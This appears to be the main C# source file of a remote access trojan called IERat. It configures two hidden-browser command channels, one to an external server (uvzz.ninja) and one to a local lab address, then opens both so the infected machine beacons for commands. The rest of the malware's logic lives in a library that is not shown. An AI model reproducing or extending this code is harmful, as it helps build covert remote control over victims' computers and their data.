using IERat.lib;
using System.Threading;
using System.Threading.Tasks;

namespace IERat
{
    class IERat
    {
        public static Channel AWSChannel = new Channel {
            BaseURL = "http://uvzz.ninja:443",
            SleepTime = 3000,
            IEvisible = false
        };

        public static Channel LocalChannel = new Channel
        {
            BaseURL = "http://192.168.135.1:1337",
            SleepTime = 3000,
            IEvisible = false
        };

        static void Main()
        {
            LocalChannel.Open();
            AWSChannel.Open();
        }
    }
}
